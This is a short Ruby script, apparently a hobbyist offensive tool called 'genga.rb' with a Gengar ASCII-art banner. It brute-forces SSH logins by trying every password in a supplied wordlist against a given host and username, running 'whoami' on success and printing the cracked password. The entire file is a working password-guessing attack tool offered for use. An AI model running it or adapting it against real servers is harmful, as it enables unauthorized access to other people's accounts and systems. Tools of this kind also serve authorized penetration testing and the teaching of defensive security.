#!/usr/bin/ruby
#Basic SSH Bruteforcer.
#Mauro Eldritch @ DC5411 - 2021.
require 'net/ssh'
require 'net/scp'
require 'colorize'
banner = """      
                    /-     .-          .:ohy.     
               -` .omo.`-/sdy   `.-:oyysdMm:`     
.os/--.       +mh:odNMdhNMMMmyysyddhhymmMy.`      
./dNhhhsyy+.+sdMMMMMMMMMMMMMMMNmddddyMMMh.`       
 `-dNdyydddNMMMMMMMMMMMMMMMMMMMMNmNmMMMh``        
  `.+dNdyyMMMMMMMMMMMMMMMMMMMMMNmMMMMMd``         
    `+mMNNMMMMMMMMMMMMMdhNMMMNdhMMMMMMd``:+`      
     `+mMMMmmMMMMMMMMMdyshmdyyyhMMMMMMMmmNo`      
      `yMmMhyyydmNMdmMNhsyhhyyyhMMMMMMMMMd.       
      `syddMhyyyhhymMMMNmdmNdddNMmhMMMMMMm/`      
     `-ssddmNdddNdmMMMMMMMMMNmmd+.-MMMMMMy`       
     .ysssh.mNMMMMMNNmdysyo:-.:+ `sMMMMMMNs:`     
     -Nssss---y///s/-`   :/   .+`sMMMMMMMMMMh/`   
   `:yNssssh- o`  +-     :/ `.:yhMMMMMMMMMMNMMs.  
  .oyymsyssshsy-..+-````./s+omNMMMMMMMMMMMNyhNMh- 
 .ohsymdhssshddmdmddddddmNMMMMMMMMMMMMMMMMhyhdNMs.
.ohydNMMdssssdddddmNMMMMMMMMMMMMMMMMMMMMMdhNmddNN/
/mdNMNsyNdsssyddddNMMMMMMMMMMMMMMMMMMMMMm..omysd+`
.ymsoo``:MshyhddNmNMMMMMMMMMMMMMMMMMMMMM+`  .` .` 
 ./ ``.yddNdNMNMMMMMMMMMMMMMMMMMMMMMMMMd:`        
   `/hhydMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.        
  `:omddhNNMMMMMMMMMMMMMMMMMMMMMMMNMMMMMM.        
  .+hdhssssNMMNmyssshmNMMMMMMmdddMmMMMMMy`        
     `+hoyyymm:`     .:hMNds:. .omdhMMNM-`        
        `+++`          -/.       `/:++-++`  
"""
begin
    puts banner.light_magenta
    if ARGV.length != 3      
        puts "\n[*] Usage: genga.rb [HOST] [USER] [PASSWORD DICTIONARY]\n[*] Example: genga.rb 127.0.0.1 admin wordlist.txt".yellow
        exit 1
    end
    checked_pass = []          #Passwords array
    remaining_pass = []        #Passwords array (for comparison)
    hostip = ARGV[0]
    usercrk = ARGV[1]
    dictionary = ARGV[2]
    pass_list = File.readlines(dictionary).map(&:chomp)
    puts "[?] #{pass_list.count} passwords loaded from dictionary #{dictionary}.".light_blue
    tries = 0
    pass_list.each do | this_pass |
        tries += 1
        puts "[?] Attempt #{tries}/#{pass_list.count}: #{this_pass}".light_yellow
        begin
            Net::SSH.start("#{hostip}", "#{usercrk}", :password => "#{this_pass}", :number_of_password_prompts => 0) do | ssh |
                crack_test = ssh.exec! ('whoami')
            end
            break
        rescue Net::SSH::AuthenticationFailed => e
            checked_pass.push("#{this_pass}")
        end
    end
    remaining_pass = (pass_list - checked_pass)
    unless pass_list.count == checked_pass.count
        passcrk = remaining_pass[0].to_s
        puts "[*] Password cracked: #{passcrk}".light_green
        cracked = true
    else
        puts  "[!] No matches found.".light_red
        cracked = false
        passcrk = "NULL"
    end
rescue => exception
    puts "Gengar has fainted: #{exception}".light_red
end